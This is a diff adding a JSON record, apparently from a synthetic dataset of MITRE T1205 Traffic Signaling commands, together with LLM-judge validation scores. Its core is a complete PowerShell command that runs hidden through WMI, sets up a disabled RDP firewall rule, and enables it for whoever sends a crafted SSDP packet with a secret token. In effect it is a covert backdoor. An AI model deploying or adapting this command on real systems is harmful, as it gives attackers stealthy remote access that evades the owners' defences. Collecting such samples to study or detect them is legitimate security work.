@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-RDP-SSDP'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-RDP-SSDP'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-SSDP'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(1900); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); $s=[Text.Encoding]::ASCII.GetString($d); if(($s -like ''*M-SEARCH*'') -and ($s -like ''*ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1*'') -and ($s -like ''*X-Token: abc123*'')){ Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-SSDP'' -Enabled True -RemoteAddress $ep.Address; break } } }'",
+  "explanation": "Inspects SSDP discovery traffic on UDP/1900 for a crafted M-SEARCH request with a specific ST target and custom header token. This UPnP/SSDP-format signal toggles RDP firewall allowance for the sender.",
+  "rationale_steps": [
+    "Create disabled firewall rule for TCP/3389.",
+    "Listen on UDP/1900 and parse ASCII SSDP headers for ST and token.",
+    "Enable the firewall rule when the crafted M-SEARCH is received."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-5411a282-aa94b416",
+  "source_prompt_hash": "5411a282",
+  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quotes/braces with correctly escaped single quotes and valid Invoke-WmiMethod/Create and PowerShell parameters render the command parseable.",
+        "semantic_score": 3,
+        "semantic_justification": "It embodies Traffic Signaling by listening for a crafted SSDP M-SEARCH to toggle an RDP firewall rule, but practical execution is hindered by likely need for admin rights and failure to bind/receive multicast on UDP/1900 without proper socket options/group join.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T12:47:21.094436Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, parentheses, and braces, correct PowerShell syntax throughout, and proper escape sequences for nested quotes.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by creating a covert signaling mechanism that listens for specially crafted SSDP packets with a specific token, which when received, dynamically enables an RDP firewall rule only for the sender's IP address.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T12:47:24.134903Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes and braces, valid parameter formats, and correct escaping for nested string literals within the PowerShell command block.",
+        "semantic_score": 3,
+        "semantic_justification": "The command semantically aligns well with Traffic Signaling by using SSDP for a trigger; however, the crucial firewall modification actions (New-NetFirewallRule, Set-NetFirewallRule) require Administrator privileges, contradicting the stated 'Privilege: None' and preventing the claimed intent from being fully achieved.",
+        "combined_score": 4.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T12:47:48.659179Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
